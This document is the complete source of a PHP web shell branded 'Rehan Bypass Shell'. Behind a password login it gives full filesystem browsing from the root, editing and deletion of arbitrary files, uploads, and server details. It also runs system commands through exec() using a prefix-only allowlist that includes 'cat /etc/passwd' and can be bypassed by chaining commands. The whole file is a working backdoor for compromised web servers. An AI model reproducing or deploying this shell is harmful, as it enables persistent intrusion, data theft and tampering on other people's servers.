<?php
session_start();

// ===== CONFIG =====
$USERNAME = 'admin';
$PASSWORD_HASH = '$2y$10$7Vhibtak6GgpW3fxQI2nDeQc6su0mRQIHr8v/H3hd18mIVNVlgo9e'; 
$BASE_DIR = '/';

// ===== LOGIN HANDLER =====
if (isset($_POST['user'], $_POST['pass'])) {
    if ($_POST['user'] === $USERNAME && password_verify($_POST['pass'], $PASSWORD_HASH)) {
        $_SESSION['logged_in'] = true;
    } else {
        $error = "Username atau password salah!";
    }
}

if (empty($_SESSION['logged_in'])) {
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Login</title>
<style>
body { font-family:sans-serif; background:#111; color:#eee; display:flex; align-items:center; justify-content:center; height:100vh; }
form { background:#222; padding:25px; border-radius:10px; box-shadow:0 0 10px #000; width:300px; }
input { width:100%; padding:8px; margin:5px 0; background:#333; color:#fff; border:1px solid #555; border-radius:5px; }
button { width:100%; padding:8px; background:#4caf50; color:#fff; border:none; border-radius:5px; cursor:pointer; }
button:hover { background:#45a049; }
.err { color:#f55; margin-bottom:10px; }
</style>
</head>
<body>
<form method="post">
    <?php if (!empty($error)) echo "<div class='err'>$error</div>"; ?>
    <input type="text" name="user" placeholder="Username" required>
    <input type="password" name="pass" placeholder="Password" required>
    <button type="submit">Login</button>
</form>
</body>
</html>
<?php
exit;
}

// ===== FILE MANAGER =====
$current = isset($_GET['path']) ? realpath($_GET['path']) : realpath($BASE_DIR);
if (!$current || !file_exists($current)) $current = realpath($BASE_DIR);
if (strpos($current, '/') !== 0) $current = '/';

// ==== DELETE HANDLER ====
if (isset($_GET['delete'])) {
    $target = realpath($_GET['delete']);
    if ($target && is_file($target)) {
        if (unlink($target)) {
            echo "<script>alert('✅ File deleted!');window.location='?path=" . urlencode(dirname($target)) . "';</script>";
        } else {
            echo "<script>alert('❌ Gagal hapus file!');window.location='?path=" . urlencode(dirname($target)) . "';</script>";
        }
    } else {
        echo "<script>alert('❌ File tidak ditemukan!');window.location='?path=" . urlencode($current) . "';</script>";
    }
    exit;
}

// ==== SAVE EDITOR ====
if (isset($_POST['save']) && isset($_POST['filepath'])) {
    $filepath = realpath($_POST['filepath']);
    if ($filepath && is_file($filepath)) {
        file_put_contents($filepath, $_POST['content']);
        echo "<script>alert('✅ File saved!');window.location='?path=".urlencode(dirname($filepath))."';</script>";
    }
    exit;
}

// ==== NEW FOLDER HANDLER ====
if (isset($_POST['new_folder']) && isset($_POST['folder_name'])) {
    $folder_name = trim($_POST['folder_name']);
    if (!empty($folder_name)) {
        $folder_path = $current . DIRECTORY_SEPARATOR . $folder_name;
        if (!file_exists($folder_path)) {
            mkdir($folder_path, 0755, true);
            echo "<script>alert('✅ Folder created!');window.location='?path=" . urlencode($current) . "';</script>";
        } else {
            echo "<script>alert('❌ Folder already exists!');window.location='?path=" . urlencode($current) . "';</script>";
        }
    }
    exit;
}

// ==== RENAME HANDLER ====
if (isset($_POST['rename']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
    $old_name = trim($_POST['old_name']);
    $new_name = trim($_POST['new_name']);
    if (!empty($old_name) && !empty($new_name) && $old_name !== $new_name) {
        $old_path = $current . DIRECTORY_SEPARATOR . $old_name;
        $new_path = $current . DIRECTORY_SEPARATOR . $new_name;
        if (file_exists($old_path) && !file_exists($new_path)) {
            if (rename($old_path, $new_path)) {
                echo "<script>alert('✅ Renamed successfully!');window.location='?path=" . urlencode($current) . "';</script>";
            } else {
                echo "<script>alert('❌ Rename failed!');window.location='?path=" . urlencode($current) . "';</script>";
            }
        } else {
            echo "<script>alert('❌ Rename failed!');window.location='?path=" . urlencode($current) . "';</script>";
        }
    }
    exit;
}

// ==== COMMAND HANDLER ====
if (isset($_POST['command']) && isset($_POST['cmd'])) {
    $cmd = trim($_POST['cmd']);
    $allowed_commands = ['ls', 'pwd', 'whoami', 'id', 'date', 'uname -a', 'php -v', 'cat /etc/passwd'];
    $is_allowed = false;
    foreach ($allowed_commands as $allowed) {
        if (strpos($cmd, $allowed) === 0) {
            $is_allowed = true;
            break;
        }
    }
    
    if ($is_allowed) {
        $output = [];
        $return_var = 0;
        exec($cmd . " 2>&1", $output, $return_var);
        $result = implode("\n", $output);
        $_SESSION['command_result'] = [
            'command' => $cmd,
            'result' => $result,
            'return_var' => $return_var
        ];
    } else {
        $_SESSION['command_result'] = [
            'command' => $cmd,
            'result' => "❌ Command not allowed!",
            'return_var' => 1
        ];
    }
    echo "<script>window.location='?path=" . urlencode($current) . "';</script>";
    exit;
}

// ==== EDIT MODE ====
if (is_file($current)) {
    $content = is_file($current) ? htmlspecialchars(file_get_contents($current)) : "Access denied";
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Edit: <?= htmlspecialchars(basename($current)) ?></title>
        <style>
            body { font-family:monospace; background:#111; color:#eee; padding:20px; }
            textarea { width:100%; height:80vh; background:#222; color:#fff; border:none; border-radius:8px; padding:10px; }
            button { padding:10px 15px; margin-top:10px; border:none; border-radius:5px; background:#4caf50; color:white; cursor:pointer; }
        </style>
    </head>
    <body>
        <h2>Editing: <?= htmlspecialchars($current) ?></h2>
        <form method="post">
            <input type="hidden" name="filepath" value="<?= htmlspecialchars($current) ?>">
            <textarea name="content"><?= $content ?></textarea><br>
            <button type="submit" name="save">Save</button>
            <a href="?path=<?= urlencode(dirname($current)) ?>" style="color:#4af;">← Back</a>
        </form>
    </body>
    </html>
    <?php
    exit;
}

$files = @scandir($current) ?: [];
$serverInfo = [
    'PHP Version' => PHP_VERSION,
    'Server Software' => $_SERVER['SERVER_SOFTWARE'] ?? 'N/A',
    'OS' => php_uname('s') . ' ' . php_uname('r'),
    'Memory Usage' => round(memory_get_usage(true) / 1024 / 1024, 2) . ' MB',
    'Disk Free Space' => round(disk_free_space("/") / 1024 / 1024 / 1024, 2) . ' GB'
];
$allowed_commands_list = ['ls', 'pwd', 'whoami', 'id', 'date', 'uname -a', 'php -v', 'cat /etc/passwd'];
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>.:𝙍𝙚𝙝𝙖𝙣 𝘽𝙮𝙥𝙖𝙨𝙨 𝙎𝙝𝙚𝙡𝙡:.</title>
<style>
body { font-family:sans-serif; background:#111; color:#eee; padding:20px; }
a { color:#4af; text-decoration:none; }
a:hover { text-decoration:underline; }
table { width:100%; border-collapse:collapse; margin-top:10px; background:#1e1e1e; border-radius:8px; overflow:hidden; }
th, td { padding:10px; border-bottom:1px solid #333; text-align:left; }
th { background:#2a2a2a; color:#4af; }
tr:hover { background:#2a2a2a; }
.control-panels { display:grid; grid-template-columns:1fr 1fr; gap:20px; margin:20px 0; }
.panel { background:#222; padding:15px; border-radius:8px; }
.panel h3 { margin-top:0; color:#4af; border-bottom:1px solid #333; padding-bottom:10px; }
.control-group { margin-bottom:10px; }
.control-group input { width:100%; padding:8px; background:#333; color:#fff; border:1px solid #444; border-radius:5px; margin-bottom:5px; }
button { padding:8px 15px; background:#4caf50; color:white; border:none; border-radius:5px; cursor:pointer; width:100%; }
.command-result { background:#222; padding:15px; border-radius:8px; margin-top:10px; }
.command-result pre { background:#1a1a1a; padding:10px; border-radius:5px; overflow-x:auto; }
.allowed-commands { font-size:12px; color:#888; margin-top:5px; }
.current-path { background:#222; padding:10px; border-radius:5px; margin-bottom:15px; font-family:monospace; }
</style>
<script>
function confirmDelete(file, url) {
    if (confirm("Hapus '" + file + "'?")) window.location = url;
}
function showRename(oldName) {
    var newName = prompt("Rename '" + oldName + "' to:", oldName);
    if (newName && newName !== oldName) {
        var form = document.createElement('form');
        form.method = 'post';
        form.innerHTML = '<input type="hidden" name="rename" value="1"><input type="hidden" name="old_name" value="' + oldName + '"><input type="hidden" name="new_name" value="' + newName + '">';
        document.body.appendChild(form);
        form.submit();
    }
}
</script>
</head>
<body>

<!-- Current Path -->
<div class="current-path">
    <strong>Path:</strong> 
    <a href='?path=/'>[..]</a>
    <?php
    $path = realpath($current);
    $parts = explode('/', trim($path, '/'));
    $build = '';
    foreach ($parts as $p) {
        if (!empty($p)) {
            $build .= '/' . $p;
            echo ' / <a href="?path=' . urlencode($build) . '">' . $p . '</a>';
        }
    }
    ?>
</div>

<!-- Control Panels -->
<div class="control-panels">
    <!-- File Operations -->
    <div class="panel">
        <h3>𝙍𝙚𝙝𝙖𝙣 𝘽𝙮𝙥𝙖𝙨𝙨 𝙎𝙝𝙚𝙡𝙡</h3>
        
        <div class="control-group">
            <form method="post">
                <input type="text" name="folder_name" placeholder="New folder name" required>
                <button type="submit" name="new_folder">Create Folder</button>
            </form>
        </div>

        <div class="control-group">
            <form method="post" enctype="multipart/form-data">
                <input type="file" name="upload" required>
                <button type="submit" name="do_upload">Upload File</button>
            </form>
        </div>

        <div class="control-group">
            <form method="post">
                <input type="text" name="cmd" placeholder="Enter command" required>
                <button type="submit" name="command">Execute Command</button>
            </form>
            <div class="allowed-commands">
                <strong>Allowed:</strong> <?= implode(', ', $allowed_commands_list) ?>
            </div>

            <?php if (isset($_SESSION['command_result'])): ?>
            <div class="command-result">
                <strong>Result:</strong>
                <pre><?= htmlspecialchars($_SESSION['command_result']['result']) ?></pre>
            </div>
            <?php unset($_SESSION['command_result']); endif; ?>
        </div>
    </div>

    <!-- Server Info -->
    <div class="panel">
        <h3>𝙎𝙚𝙧𝙫𝙚𝙧 𝙄𝙣𝙛𝙤</h3>
        <table>
            <?php foreach ($serverInfo as $key => $value): ?>
            <tr><td><?= $key ?></td><td><?= $value ?></td></tr>
            <?php endforeach; ?>
        </table>
    </div>
</div>

<!-- File List -->
<table>
    <tr><th>Name</th><th>Size</th><th>Modified</th><th>Actions</th></tr>
    <?php
    $parent = dirname($current);
    if ($current !== '/' && $parent !== $current) {
        echo "<tr><td colspan='4'><a href='?path=" . urlencode($parent) . "'>[..]</a></td></tr>";
    }

    foreach ($files as $f) {
        if ($f === '.' || $f === '..') continue;
        $fp = $current . '/' . $f;
        if (!file_exists($fp)) continue;
        
        echo "<tr>
                <td>" . (is_dir($fp) ? "📁" : "📄") . " <a href='?path=" . urlencode($fp) . "'>$f</a></td>
                <td>" . (is_file($fp) ? number_format(filesize($fp)) . ' B' : 'DIR') . "</td>
                <td>" . date('Y-m-d H:i', filemtime($fp)) . "</td>
                <td>";
        if (is_file($fp)) {
            echo "<a href='?path=" . urlencode($fp) . "'>Edit</a> | ";
        }
        echo "<a href='javascript:void(0)' onclick=\"showRename('$f')\">Rename</a> | 
              <a href='javascript:void(0)' onclick=\"confirmDelete('$f','?delete=" . urlencode($fp) . "')\">Delete</a>
              </td></tr>";
    }
    ?>
</table>

<?php
if (isset($_FILES['upload']) && isset($_POST['do_upload'])) {
    $target = $current . '/' . basename($_FILES['upload']['name']);
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $target)) {
        echo "<script>alert('Uploaded!');window.location='?path=" . urlencode($current) . "';</script>";
    }
}
?>
</body>
</html>